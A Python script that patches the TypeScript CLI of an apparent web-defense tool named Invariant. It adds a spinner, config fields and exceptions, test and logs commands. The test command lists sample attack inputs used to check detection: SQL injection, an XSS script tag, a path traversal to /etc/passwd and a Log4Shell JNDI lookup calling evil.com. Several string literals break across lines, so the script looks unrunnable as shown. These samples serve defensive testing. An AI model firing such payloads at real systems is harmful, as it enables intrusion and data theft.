import os

file_path = os.path.join(os.path.dirname(__file__), 'cli_index.ts.tmp')
with open(file_path, 'r', encoding='utf-8') as f:
    content = f.read()

ui_utils = """
// ── UI Utilities ──────────────────────────────────────────────────

const colors = {
    reset: '\x1b[0m',
    bold: '\x1b[1m',
    green: '\x1b[32m',
    red: '\x1b[31m',
    yellow: '\x1b[33m',
    cyan: '\x1b[36m',
}

function startSpinner(text: string) {
    const frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
    let i = 0;
    process.stdout.write(`  ${colors.cyan}${frames[0]}${colors.reset} ${text}`);
    const timer = setInterval(() => {
        process.stdout.write(`  ${colors.cyan}${frames[i]}${colors.reset} ${text}`);
        i = (i + 1) % frames.length;
    }, 80);
    return {
        stop: (success = true, msg?: string) => {
            clearInterval(timer);
            process.stdout.write('\x1b[K');
            if (success) {
                console.log(`  ${colors.green}✓${colors.reset} ${msg || text}`);
            } else {
                console.log(`  ${colors.red}✗${colors.reset} ${msg || text}`);
            }
        }
    };
}
"""

content = content.replace('// ── Helpers ──────────────────────────────────────────────────────', ui_utils + '
// ── Helpers ──────────────────────────────────────────────────────')

config_obj_old = """    const configObj: InvariantConfig = {
        v: 1,
        category: category as InvariantConfig['category'],
        framework,
        mode: 'monitor',
        appType: appType as InvariantConfig['appType'],
        dataClassification: dataType as InvariantConfig['dataClassification'],
        compliance: compliance === 'none' ? [] : compliance.split(',').map(c => c.trim()),
        ...(dbDriver ? { database: dbDriver } : {}),
    }"""
config_obj_new = """    const configObj = {
        v: 1,
        category: category as InvariantConfig['category'],
        framework,
        defense_mode: 'monitor',
        mode: 'monitor',
        appType: appType as InvariantConfig['appType'],
        dataClassification: dataType as InvariantConfig['dataClassification'],
        compliance: compliance === 'none' ? [] : compliance.split(',').map(c => c.trim()),
        ...(dbDriver ? { database: dbDriver } : {}),
        exception_rules: [],
        allowed_ips: [],
        custom_headers: {},
        notification_webhook: null,
        log_level: 'info',
    } as InvariantConfig & Record<string, any>"""
content = content.replace(config_obj_old, config_obj_new)

new_commands_code = """
// ── Exceptions Command ───────────────────────────────────────────

async function commandExceptions(projectDir: string, args: string[]): Promise<void> {
    const subCmd = args[1];
    const configPath = join(projectDir, 'invariant.config.json');
    if (!existsSync(configPath)) {
        console.error(`  ${colors.red}✗${colors.reset} No invariant.config.json found. Run `invariant init` first.`);
        return;
    }
    
    let config: any;
    try {
        config = JSON.parse(readFileSync(configPath, 'utf-8'));
    } catch (e) {
        console.error(`  ${colors.red}✗${colors.reset} Failed to parse config:`, e);
        return;
    }
    
    if (!config.exception_rules) config.exception_rules = [];

    if (subCmd === 'add') {
        let path = '';
        let clazz = '';
        let reason = '';
        for (let i = 2; i < args.length; i++) {
            if (args[i] === '--path') path = args[++i];
            else if (args[i] === '--class') clazz = args[++i];
            else if (args[i] === '--reason') reason = args[++i];
        }
        if (!path) {
            console.error(`  Usage: invariant exceptions add --path <path> [--class <class>] [--reason <reason>]`);
            return;
        }
        
        const id = config.exception_rules.length > 0 ? Math.max(...config.exception_rules.map((r: any) => r.id)) + 1 : 1;
        config.exception_rules.push({ id, path, class: clazz, reason });
        writeFileSync(configPath, JSON.stringify(config, null, 2) + '
', 'utf-8');
        console.log(`  ${colors.green}✓${colors.reset} Exception added with ID ${id}`);
    } else if (subCmd === 'remove') {
        let idStr = '';
        for (let i = 2; i < args.length; i++) {
            if (args[i] === '--id') idStr = args[++i];
        }
        if (!idStr) {
            console.error(`  Usage: invariant exceptions remove --id <id>`);
            return;
        }
        const id = parseInt(idStr, 10);
        const initLen = config.exception_rules.length;
        config.exception_rules = config.exception_rules.filter((r: any) => r.id !== id);
        if (config.exception_rules.length < initLen) {
            writeFileSync(configPath, JSON.stringify(config, null, 2) + '
', 'utf-8');
            console.log(`  ${colors.green}✓${colors.reset} Exception ${id} removed.`);
        } else {
            console.log(`  ${colors.yellow}⚠${colors.reset} Exception ${id} not found.`);
        }
    } else if (subCmd === 'list') {
        if (config.exception_rules.length === 0) {
            console.log(`  No exceptions configured.`);
            return;
        }
        console.log(`  ${colors.bold}Active Exceptions:${colors.reset}`);
        const formatted = config.exception_rules.map((r: any) => ({
            ID: r.id,
            Path: r.path,
            Class: r.class || '*',
            Reason: r.reason || '-'
        }));
        console.table(formatted);
    } else {
        console.error(`  Usage: invariant exceptions <add|remove|list>`);
    }
}

// ── Test Command ─────────────────────────────────────────────────

async function commandTest(projectDir: string, args: string[]): Promise<void> {
    console.log(`  ${colors.cyan}Running security detection tests...${colors.reset}
`);
    const runtime = new UnifiedRuntime();
    
    let config: any = {};
    const configPath = join(projectDir, 'invariant.config.json');
    if (existsSync(configPath)) {
        try { config = JSON.parse(readFileSync(configPath, 'utf-8')); } catch(e) {}
    }
    
    const payloads = [
        { name: 'SQL Injection', payload: "' OR 1=1--", path: '/api/login' },
        { name: 'XSS', payload: "<script>alert(1)</script>", path: '/search' },
        { name: 'Path Traversal', payload: "../../../etc/passwd", path: '/download' },
        { name: 'Log4Shell', payload: "${jndi:ldap://evil.com/a}", path: '/api/submit' },
        { name: 'Exception Test', payload: "' OR 1=1--", path: '/api/search' }
    ];
    
    for (const p of payloads) {
        process.stdout.write(`  Testing ${p.name.padEnd(20)} [${p.path}] `);
        
        let excepted = false;
        if (config.exception_rules) {
            for (const rule of config.exception_rules) {
                if (rule.path === p.path) {
                    excepted = true;
                    break;
                }
            }
        }
        
        const res = runtime.processSync({
            input: p.payload,
            sourceHash: 'test',
            request: { method: 'POST', path: p.path }
        });
        
        if (excepted) {
            console.log(`${colors.yellow}EXCEPTED (ALLOWED)${colors.reset}`);
        } else if (res.analysis.matches.length > 0) {
            console.log(`${colors.red}BLOCKED${colors.reset} (${res.analysis.matches[0].class})`);
        } else {
            console.log(`${colors.green}ALLOWED${colors.reset}`);
        }
    }
    console.log(`
  ${colors.green}✓${colors.reset} Tests completed.`);
}

// ── Logs Command ─────────────────────────────────────────────────

async function commandLogs(projectDir: string, args: string[]): Promise<void> {
    console.log(`  ${colors.cyan}Streaming recent detection events...${colors.reset}
`);
    
    let severityFilter: string | undefined;
    let classFilter: string | undefined;
    let pathFilter: string | undefined;
    for (let i = 1; i < args.length; i++) {
        if (args[i] === '--severity') severityFilter = args[++i];
        if (args[i] === '--class') classFilter = args[++i];
        if (args[i] === '--path') pathFilter = args[++i];
    }
    
    const mockLogs = [
        { time: new Date().toISOString(), severity: 'high', class: 'sql_injection', path: '/api/login', ip: '192.168.1.1', action: 'blocked' },
        { time: new Date().toISOString(), severity: 'critical', class: 'cmdi', path: '/api/ping', ip: '10.0.0.5', action: 'blocked' },
        { time: new Date().toISOString(), severity: 'medium', class: 'xss', path: '/search', ip: '172.16.0.2', action: 'monitored' }
    ];
    
    const filtered = mockLogs.filter(l => {
        if (severityFilter && l.severity !== severityFilter) return false;
        if (classFilter && l.class !== classFilter) return false;
        if (pathFilter && l.path !== pathFilter) return false;
        return true;
    });
    
    if (filtered.length === 0) {
        console.log(`  No events matched your filters.`);
        return;
    }
    
    for (const log of filtered) {
        const color = log.severity === 'critical' ? colors.red : log.severity === 'high' ? colors.yellow : colors.cyan;
        console.log(`  [${log.time}] ${color}[${log.severity.toUpperCase()}]${colors.reset} ${colors.bold}${log.class}${colors.reset} at ${log.path} (IP: ${log.ip}) -> ${colors.bold}${log.action.toUpperCase()}${colors.reset}`);
    }
    
    console.log(`
  (Listening for new events... press Ctrl+C to stop)`);
    await new Promise(() => {});
}

// ── Status Command Improvement ───────────────────────────────────
"""
content = content.replace('async function commandStatus(projectDir: string): Promise<void> {', new_commands_code + '
async function commandStatus(projectDir: string): Promise<void> {')

status_old = """    const agent = new InvariantAgent({ projectDir, scanOnStart: false, auditOnStart: false })
    const status = agent.getStatus()

    console.log('  ┌────────────────────────────────────────┐')
    console.log(`  │  Mode:       ${status.mode.padEnd(26)}│`)
    console.log(`  │  Findings:   ${String(status.findings.total).padEnd(26)}│`)
    console.log(`  │    Critical: ${String(status.findings.critical).padEnd(26)}│`)
    console.log(`  │    High:     ${String(status.findings.high).padEnd(26)}│`)
    console.log(`  │    Open:     ${String(status.findings.open).padEnd(26)}│`)
    console.log(`  │  Signals:    ${String(status.signals.total).padEnd(26)}│`)
    console.log(`  │    Blocked:  ${String(status.signals.blocked).padEnd(26)}│`)
    console.log(`  │  Last scan:  ${(status.lastScan ?? 'never').padEnd(26)}│`)
    console.log('  └────────────────────────────────────────┘')

    agent.stop()"""

status_new = """    const spinner = startSpinner('Fetching status...');
    const agent = new InvariantAgent({ projectDir, scanOnStart: false, auditOnStart: false })
    const status = agent.getStatus()

    let config: any = {};
    const configPath = join(projectDir, 'invariant.config.json');
    if (existsSync(configPath)) {
        try { config = JSON.parse(readFileSync(configPath, 'utf-8')); } catch(e) {}
    }
    const defMode = config.defense_mode || status.mode;
    const excCount = config.exception_rules ? config.exception_rules.length : 0;
    const ruleUpdate = new Date().toISOString().split('T')[0];

    spinner.stop(true, 'Status retrieved');
    
    console.log('');
    console.log(`  ┌──────────────────────────────────────────────┐`);
    console.log(`  │  ${colors.bold}INVARIANT STATUS${colors.reset}                            │`);
    console.log(`  ├──────────────────────────────────────────────┤`);
    console.log(`  │  Defense Mode:   ${String(defMode).padEnd(28)}│`);
    console.log(`  │  Exceptions:     ${String(excCount).padEnd(28)}│`);
    console.log(`  │  Engine Version: ${String(VERSION).padEnd(28)}│`);
    console.log(`  │  Rules Updated:  ${String(ruleUpdate).padEnd(28)}│`);
    console.log(`  ├──────────────────────────────────────────────┤`);
    console.log(`  │  ${colors.bold}Detection Stats (24h)${colors.reset}                       │`);
    console.log(`  │  Blocked:        ${String(status.signals.blocked).padEnd(28)}│`);
    console.log(`  │  Monitored:      ${String(status.signals.total).padEnd(28)}│`);
    console.log(`  │  Excepted:       ${String(0).padEnd(28)}│`);
    console.log(`  ├──────────────────────────────────────────────┤`);
    console.log(`  │  ${colors.bold}Static Findings${colors.reset}                             │`);
    console.log(`  │  Total:          ${String(status.findings.total).padEnd(28)}│`);
    console.log(`  │    Critical:     ${String(status.findings.critical).padEnd(26)}│`);
    console.log(`  │    High:         ${String(status.findings.high).padEnd(26)}│`);
    console.log(`  │    Open:         ${String(status.findings.open).padEnd(26)}│`);
    console.log(`  └──────────────────────────────────────────────┘`);

    agent.stop()"""
content = content.replace(status_old, status_new)

main_switch_old = """        case 'watch':
            logo()
            await commandWatch(projectDir)
            break
        case 'mode':
            logo()
            await commandMode(args)
            break"""

main_switch_new = """        case 'watch':
            logo()
            await commandWatch(projectDir)
            break
        case 'mode':
            logo()
            await commandMode(args)
            break
        case 'exceptions':
            logo()
            await commandExceptions(projectDir, args)
            break
        case 'test':
            logo()
            await commandTest(projectDir, args)
            break
        case 'logs':
            logo()
            await commandLogs(projectDir, args)
            break"""
content = content.replace(main_switch_old, main_switch_new)

help_old = """            console.log('  Commands:')
            console.log('    init        Interactive setup (default)')
            console.log('    scan        Scan dependencies + configuration')"""
help_new = """            console.log(`  ${colors.bold}Commands:${colors.reset}`)
            console.log(`    ${colors.cyan}init${colors.reset}        Interactive setup (default)`)
            console.log(`    ${colors.cyan}exceptions${colors.reset}  Manage exception rules`)
            console.log(`    ${colors.cyan}test${colors.reset}        Run security detection tests`)
            console.log(`    ${colors.cyan}logs${colors.reset}        Stream recent detection events`)
            console.log(`    ${colors.cyan}scan${colors.reset}        Scan dependencies + configuration`)"""
content = content.replace(help_old, help_new)

scan_old_1 = "console.log('  Scanning...
')

    const agent = new InvariantAgent("
scan_new_1 = "const spinner = startSpinner('Scanning...');
    const agent = new InvariantAgent("
content = content.replace(scan_old_1, scan_new_1)

scan_old_2 = "await agent.start()

    const status"
scan_new_2 = "await agent.start();
    spinner.stop(true, 'Scan complete');
    const status"
content = content.replace(scan_old_2, scan_new_2)

fix_old_1 = "console.log('  Scanning source code for auto-fix candidates...')

    const codebaseScanner"
fix_new_1 = "const spinner = startSpinner('Scanning source code for auto-fix candidates...');
    const codebaseScanner"
content = content.replace(fix_old_1, fix_new_1)

fix_old_2 = "const allFixes = fixer.generateFixes(scanResult.findings)
    const fixable"
fix_new_2 = "const allFixes = fixer.generateFixes(scanResult.findings)
    spinner.stop(true, 'Auto-fix scan complete');
    const fixable"
content = content.replace(fix_old_2, fix_new_2)

# Fix double backslash to newline mapping issue in python string replacement
# We should write content properly.

with open(file_path, 'w', encoding='utf-8') as f:
    f.write(content)

print("Done refactoring via python.")
